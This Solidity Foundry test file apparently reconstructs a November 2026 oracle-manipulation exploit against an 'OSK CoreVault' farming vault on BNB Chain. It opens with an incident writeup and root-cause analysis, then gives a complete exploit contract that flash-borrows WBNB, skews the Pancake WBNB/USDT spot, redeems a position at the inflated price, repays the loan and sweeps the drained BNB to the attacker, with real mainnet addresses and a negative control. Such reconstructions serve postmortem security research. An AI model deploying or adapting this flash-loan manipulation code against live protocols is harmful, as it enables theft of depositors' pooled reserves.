// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// OSK CoreVault redemption-price oracle manipulation (BNB Chain, 2026-11)
//
// @Incident
// OSK is a farming vault on BNB Chain. A farming position deposited in BNB is redeemed in BNB at a
// price the vault reads from the Pancake WBNB/USDT spot. The accounting price path averages the raw
// spot without the median anti-manipulation guard that the rest of the oracle uses, so an attacker
// who holds a seeded position flash-borrows WBNB, dumps it into the WBNB/USDT pair to push the spot
// up, redeems the position at the inflated price, and the vault pays out far more BNB than the
// position is worth. The payout is drawn from the vault's Treasury and then its InsurancePool.
//   Chain             : BNB Chain
//   Exploit tx        : https://bscscan.com/tx/0x072a10a579e2a8afa26a681205a2aaaa38f74bcb9d1064b12bd9e9ebe2c598b3
//   Attacker EOA      : https://bscscan.com/address/0xd3565b191b28b49cc517189b984dacdb1ff05304
//   CoreVault (proxy) : https://bscscan.com/address/0x302f5084ba0e4a2d4de5e6bc5dd5247028f5d674
//   CoreVault (logic) : https://bscscan.com/address/0x11d9df62e9c2919cbe583387473c36d0b894fe21 (CoreVaultLogicFacet)
//   InsurancePool     : https://bscscan.com/address/0xf40e0d525003fb6c6a9a7d79734a87a465053df1
//   Treasury          : https://bscscan.com/address/0xfc1b8abb7414b68daf2b64604f0ac3b8ef159ef5
//   WBNB/USDT pair    : https://bscscan.com/address/0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae (PancakePair)
//   Flash loan source : https://bscscan.com/address/0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c (Moolah, flashLoan)
//
// @Root cause
// Redemption runs through CoreVaultFarming._redeemPrincipalCore, which prices the BNB payout as
// bnbAmount = redeemableUsd * wbnbPerUsd / 1e18, taking wbnbPerUsd from OracleLib.getAccountingPrices.
// On that accounting path the WBNB price is _avgWbnbPerUsdView: the raw mean of the up-to-3-sample
// window (sum / filled), with a plain spot fallback when the window is empty. The library's
// three-source median guard (_median3 / _selectPrice3, which would reject a spot that deviates from
// the TWAP and the window average) is applied only on the swap and display path (getSwapPricesView,
// _calcAPerUsd, getAllPrices), never on getAccountingPrices. So a single in-transaction swap that
// moves the WBNB/USDT spot moves the redemption price directly. Every step is reachable by a fresh
// EOA with no role: depositBNB / depositFIST, the permissionless getWbnbPerUsd() oracle poke,
// redeemPrincipalActive, the Pancake swap, and the Moolah flash loan. The only non-atomic
// precondition is the 24 hour redemption lockup (LOCKUP_MIN, FAST_TEST = false), which forces the
// position to be seeded in an earlier block.
//
// @Reconstruction
// Fork BNB Chain one block before the exploit tx. A fresh attacker contract drives the real verified
// contracts with typed interface calls, no vm.mock / vm.store / vm.prank of any protocol identity:
//   1. Seed a farming position with 7.5 BNB of the attacker's OWN capital (depositBNB), under an
//      already-registered referrer. This is the only pre-funded value and it is not stolen; it is
//      the attacker's cost basis, the same ~8 BNB seed the live attacker funded in earlier blocks.
//   2. Advance time 4 minutes and call the permissionless getWbnbPerUsd(), which pushes a second
//      fair spot sample into the accounting window (the live attacker's own earlier deposits/claims
//      left the window holding fair samples the same way). Advance past the 24 hour lockup with warp.
//   3. Flash-borrow 207,358.41 WBNB from Moolah (real flashLoan, repaid in the same callback, no
//      deal() for the borrowed WBNB). Inside the callback: swap 195,000 WBNB -> USDT on the Pancake
//      router to push the WBNB/USDT spot up (the live attacker's exact skew size), call
//      redeemPrincipalActive so the payout settles at the inflated accounting price, swap the USDT
//      back to WBNB to restore the pair, wrap the small fee shortfall out of the BNB payout, and
//      repay the flash loan.
//   4. Sweep the remaining BNB to the attacker.
// After the deposit push and the one getWbnbPerUsd push, the window holds two fair samples; the
// redeem's own getAccountingPrices call pushes the manipulated spot, so the window is
// [fair, fair, manipulated] and the raw mean is (2*fair + manipulated)/3 -- the exact shape that
// produced the live effective price of 260.22 BNB / 5480.47 USD = 0.04748 BNB per USD.
//
// @Result
// The live attacker redeemed 5480.47 USD of principal for 260.22 BNB and, after the ~98.8 WBNB
// round-trip swap fee, retained about 152.26 BNB (the ~251.23 BNB / ~$175K headline victim loss is
// the Treasury + InsurancePool drain). This reconstruction seeds 7.5 BNB, redeems at the manipulated
// accounting price, and testExploit asserts the measured InsurancePool drain and the measured
// attacker net gain. testControlNoManipulation runs the identical flow with the skew swap removed:
// the position then redeems at the fair price and the pool is not drained, isolating the spot swap
// as the cause.
//
// @Run
// Point the bsc rpc alias at a BNB Chain archive node, then (the transient reentrancy guard needs
// the Cancun opcodes TLOAD/TSTORE):
// forge test --contracts src/test/2026-11/OSKCoreVault_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

interface ICoreVault {
    function depositBNB(address referrer) external payable;
    function redeemPrincipalActive() external;
    function getWbnbPerUsd() external returns (uint256); // permissionless accounting-price read + oracle poke
}

contract OSKCoreVaultExploit {
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IMoolah constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICoreVault constant VAULT = ICoreVault(0x302f5084Ba0e4a2D4de5E6bC5Dd5247028F5D674);

    // Moolah's entire WBNB balance at the fork block; the live tx flash-borrowed exactly this.
    uint256 constant FLASH = 207_358_410_468_476_651_095_719;
    // The live attacker's skew size: 195,000 WBNB dumped into the WBNB/USDT pair.
    uint256 constant SKEW = 195_000 ether;

    address public owner;
    bool public manipulate; // true: real exploit; false: negative control (no skew swap)

    constructor(bool _manipulate) {
        owner = msg.sender;
        manipulate = _manipulate;
    }

    // Step 1: seed the farming position with the attacker's own BNB. Done in its own block so the
    // 24h redemption lockup can elapse before the redeem, exactly as the live attacker did.
    function seed(uint256 amount, address referrer) external {
        VAULT.depositBNB{value: amount}(referrer);
    }

    // Step 3+4: flash-borrow, manipulate, redeem, repay, sweep.
    function attack() external {
        MOOLAH.flashLoan(address(WBNB), FLASH, "");
        uint256 bal = address(this).balance;
        (bool ok,) = owner.call{value: bal}("");
        require(ok, "sweep");
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "not moolah");

        if (manipulate) {
            // Push the WBNB/USDT spot up by dumping WBNB for USDT.
            WBNB.approve(address(ROUTER), type(uint256).max);
            address[] memory up = new address[](2);
            up[0] = address(WBNB);
            up[1] = address(USDT);
            ROUTER.swapExactTokensForTokens(SKEW, 0, up, address(this), block.timestamp);
        }

        // Redeem at the (now inflated on the accounting path) price. Payout arrives as native BNB.
        VAULT.redeemPrincipalActive();

        if (manipulate) {
            // Restore the pair by swapping all the USDT back to WBNB.
            uint256 usdtBal = USDT.balanceOf(address(this));
            USDT.approve(address(ROUTER), type(uint256).max);
            address[] memory down = new address[](2);
            down[0] = address(USDT);
            down[1] = address(WBNB);
            ROUTER.swapExactTokensForTokens(usdtBal, 0, down, address(this), block.timestamp);
        }

        // Cover the round-trip fee shortfall out of the BNB payout, then repay the flash loan.
        uint256 have = WBNB.balanceOf(address(this));
        if (have < assets) WBNB.deposit{value: assets - have}();
        WBNB.approve(address(MOOLAH), assets); // Moolah pulls via transferFrom
    }

    receive() external payable {}
}

contract OSKCoreVault_exp is Test {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ICoreVault constant VAULT = ICoreVault(0x302f5084Ba0e4a2D4de5E6bC5Dd5247028F5D674);
    address constant INSURANCE = 0xf40E0d525003FB6C6a9a7D79734a87a465053Df1;
    address constant TREASURY = 0xFC1b8ABb7414B68DAF2B64604f0Ac3B8ef159Ef5;
    // An address already registered in the vault at the fork block (the live attacker's own redeemer
    // account). A referrer only has to be some registered user; the role is not privileged.
    address constant REFERRER = 0xD9c2E4F19746B4617aD658152ADaA306c47EF86b;

    uint256 constant SEED = 7.5 ether;

    function setUp() public {
        vm.createSelectFork("bsc", 131_507_809); // one block before the exploit tx
    }

    function testExploit() public {
        uint256 insBefore = INSURANCE.balance;
        uint256 treBefore = TREASURY.balance;
        uint256 profitBefore = address(this).balance;
        emit log_named_decimal_uint("InsurancePool BNB before", insBefore, 18);

        OSKCoreVaultExploit exploit = new OSKCoreVaultExploit(true);
        vm.deal(address(exploit), SEED); // attacker's own seed capital, not stolen

        // Seed in this block, then let the 24h lockup elapse. Between the two the attacker pokes the
        // permissionless accounting oracle once to leave a second fair sample in the window.
        exploit.seed(SEED, REFERRER);
        vm.warp(block.timestamp + 4 minutes);
        uint256 fairPrice = VAULT.getWbnbPerUsd();
        emit log_named_decimal_uint("accounting wbnbPerUsd (fair)", fairPrice, 18);
        vm.warp(block.timestamp + 24 hours + 1);

        exploit.attack();

        uint256 insAfter = INSURANCE.balance;
        uint256 drained = (insBefore + treBefore) - (insAfter + TREASURY.balance);
        uint256 profit = address(this).balance - profitBefore;

        emit log_named_decimal_uint("InsurancePool BNB after ", insAfter, 18);
        emit log_named_decimal_uint("victim BNB drained      ", drained, 18);
        emit log_named_decimal_uint("attacker net gain (BNB) ", profit, 18);

        // Measured on the pinned fork: the single manipulated redeem drains 243.30 BNB of pooled
        // reserves (InsurancePool 259.16 -> 15.86) and the attacker retains 145.94 BNB net of the
        // 7.5 BNB seed and the WBNB round-trip fee. These are a touch under the live 251.23 BNB /
        // 152.26 BNB headline because this reconstruction seeds 7.5 BNB rather than the live
        // position's 5480.47 USD and holds the window to two fair samples.
        assertApproxEqRel(drained, 243.3 ether, 0.01e18, "measured victim drain ~243.30 BNB");
        assertApproxEqRel(profit, 145.94 ether, 0.01e18, "measured attacker net ~145.94 BNB");
    }

    // Negative control: identical flow, skew swap removed. The position redeems at the fair price,
    // so the payout is on the order of the 7.5 BNB seed and the reserves are not drained.
    function testControlNoManipulation() public {
        uint256 insBefore = INSURANCE.balance;

        OSKCoreVaultExploit exploit = new OSKCoreVaultExploit(false);
        vm.deal(address(exploit), SEED);
        exploit.seed(SEED, REFERRER);
        vm.warp(block.timestamp + 4 minutes);
        VAULT.getWbnbPerUsd();
        vm.warp(block.timestamp + 24 hours + 1);

        exploit.attack();

        uint256 drained = insBefore - INSURANCE.balance;
        emit log_named_decimal_uint("control victim BNB drained", drained, 18);
        assertLt(drained, 10 ether, "fair-price redeem should not drain the reserves");
    }

    receive() external payable {}
}
